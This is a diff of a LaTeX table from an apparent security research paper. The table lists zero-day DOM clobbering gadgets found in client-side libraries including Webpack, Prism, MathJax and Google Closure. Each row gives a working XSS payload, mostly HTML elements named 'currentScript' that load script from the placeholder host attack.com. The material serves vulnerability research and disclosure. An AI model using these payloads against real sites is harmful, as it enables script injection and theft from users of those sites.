@@ -5,10 +5,11 @@
 \caption{A selective list of zero-day gadgets found by \sys in high-profile client-side libraries with over 1,000 stars on GitHub.}
 \label{table:rq1-zero-day-gadgets}
 \vspace{5pt}
-\begin{tabular}{cccccccp{0.02\textwidth}p{0.32\textwidth}}
+\setlength{\tabcolsep}{2pt}
+\begin{tabular}{cccccccp{0pt}p{0.43\textwidth}}
 \toprule
  \multirow{2}{*}{\textbf{Library}} &
- \multirow{2}{*}{\textbf{Stars}} &
+ \multirow{2}{*}{\textbf{\# of Stars}} &
  \multirow{2}{*}{\textbf{Version}} &
  \multirow{2}{*}{\textbf{Conseq.}} &
  \multirow{2}{*}{\textbf{Status}} &
@@ -18,18 +19,18 @@
  \cmidrule(lr){6-7}
  & & & & & Det./Exp. & Det./Exp. & \\
 \midrule
-Webpack & 64.4K & v5.93.0 & XSS & CVE-2024-43788 & \Circle & \CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com"\textgreater </img\textgreater } \\ 
-Prism & 12.2K & v1.29.0 & XSS & N/A & \Circle & \CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com/a.js"\textgreater </img\textgreater } \\ 
-MathJax & 10.1K & v2.7.x & XSS & N/A & \Circle & \CIRCLE & &\tightcode{<a id="MathJax"\textgreater </a\textgreater  <a id="MathJax" name="root" href="https://attack.com"\textgreater </a\textgreater } \\ 
-MathJax & 10.1K & v3.2.2 & XSS & N/A & \Circle & \CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com"\textgreater </img\textgreater  \$\$\textbackslash require{tex}\$\$} \\ 
-rspack & 8.6K & v1.0.0-rc.0 & XSS & N/A & \Circle & \CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com"\textgreater </img\textgreater } \\ 
-Google Closure & 4.9K & v20230103 & XSS & Reported & \Circle & \CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com/base.js"\textgreater </img\textgreater } \\ 
-pagefind & 3.3K & v1.1.0 & XSS & N/A & \Circle & \CIRCLE & &\tightcode{<img name="currentScript" src="blob:https://attack.com/ui.js"\textgreater </img\textgreater } \\ 
-steal & 1.4K & v2.3.0 & XSS & N/A & \Circle & \CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com"\textgreater <img\textgreater } \\ 
-polyfills & 1.1K & v2.8.0 & XSS & N/A & \Circle & \CIRCLE & &\tightcode{<a id="ShadyDOM"\textgreater </a\textgreater <a id="ShadyDOM" name="force"\textgreater </a\textgreater <a id="WebComponents"\textgreater </a\textgreater <a id="WebComponents" name="root" href="https://attack.com"\textgreater </a\textgreater } \\ 
-doomcaptcha & 1K & latest & XSS & N/A & \Circle & \CIRCLE & &\tightcode{<img name="currentScript" label="<script\textgreater alert(1)</script\textgreater "\textgreater </img\textgreater } \\ 
-AddToAny & N/A & N/A & XSS & N/A & \Circle & \CIRCLE & &\tightcode{<img src="https://addtoany.attack.com name="currentScript"\textgreater } \\ 
-Google Client API & N/A & 5BIk7BglYEE & XSS & Patched & \Circle & \CIRCLE & &\tightcode{<iframe name="scripts" src=”https://apis.google.com/js/api.js”\textgreater alert("GG!")</iframe\textgreater <iframe name="scripts" src=”https://apis.google.com/js/api.js”\textgreater alert("GG!")</iframe\textgreater } \\ 
+Webpack & 64.4K & v5.93.0 & XSS & CVE-2024-43788 & \Circle &\CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com"\textgreater </img\textgreater } \\ 
+Prism & 12.2K & v1.29.0 & XSS & N/A & \Circle &\CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com/a.js"\textgreater </img\textgreater } \\ 
+MathJax2 & 10.1K & v2.7.9 & XSS & N/A & \Circle &\CIRCLE & &\tightcode{<a id="MathJax"\textgreater </a\textgreater  <a id="MathJax" name="root" href="https://attack.com"\textgreater </a\textgreater } \\ 
+MathJax3 & 10.1K & v3.2.2 & XSS & N/A & \Circle &\CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com"\textgreater </img\textgreater  \$\$\textbackslash require\{\}tex\}\$\$} \\ 
+rspack & 8.6K & v1.0.0-rc.0 & XSS & N/A & \Circle &\CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com"\textgreater </img\textgreater } \\ 
+Google Closure & 4.9K & v20230103 & XSS & Reported & \Circle &\CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com/base.js"\textgreater </img\textgreater } \\ 
+pagefind & 3.3K & v1.1.0 & XSS & N/A & \Circle &\CIRCLE & &\tightcode{<img name="currentScript" src="blob:https://attack.com/ui.js"\textgreater </img\textgreater } \\ 
+steal & 1.4K & v2.3.0 & XSS & N/A & \Circle &\CIRCLE & &\tightcode{<img name="currentScript" src="https://attack.com"\textgreater } \\ 
+polyfills & 1.1K & v2.8.0 & XSS & N/A & \LEFTcircle &\CIRCLE & &\tightcode{<a id="ShadyDOM"\textgreater </a\textgreater <a id="ShadyDOM" name="force"\textgreater </a\textgreater <a id="WebComponents"\textgreater </a\textgreater <a id="WebComponents" name="root" href="https://attack.com"\textgreater </a\textgreater } \\ 
+doomcaptcha & 1K & latest & XSS & N/A & \LEFTcircle &\CIRCLE & &\tightcode{<img name=currentScript label="<script\textgreater alert(1)</script\textgreater "\textgreater </img\textgreater } \\ 
+AddToAny & N/A & N/A & XSS & N/A & \Circle &\CIRCLE & &\tightcode{<img src="https://addtoany.attack.com name="currentScript"\textgreater } \\ 
+Google Client API & N/A & 5BIk7BglYEE & XSS & Patched & \Circle &\CIRCLE & &\tightcode{<iframe name="scripts" src=”https://apis.google.com/js/api.js”\textgreater </iframe\textgreater <iframe name="scripts" src=”https://apis.google.com/js/api.js”\textgreater alert(1)</iframe\textgreater } \\ 
 
 \bottomrule
 \end{tabular}
